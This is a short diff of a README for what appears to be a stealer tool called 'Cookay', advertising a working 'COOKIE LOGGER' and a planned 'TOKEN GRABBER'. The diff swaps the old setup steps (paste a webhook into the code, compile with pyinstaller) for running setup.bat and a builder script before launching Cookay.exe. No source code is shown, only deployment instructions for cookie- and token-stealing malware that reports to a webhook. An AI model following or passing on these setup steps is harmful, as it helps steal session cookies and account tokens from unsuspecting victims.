@@ -1,6 +1,7 @@
 COOKIE LOGGER✅
 TOKEN GRABBER (SOON)
-〢 Setting Up
-Put ur webhook at WebHook = ""
-Compile it with pyinstaller
+
+Setting Up
+Run setup.bat
+Compile it with builder.pwy
 Run Cookay.exe
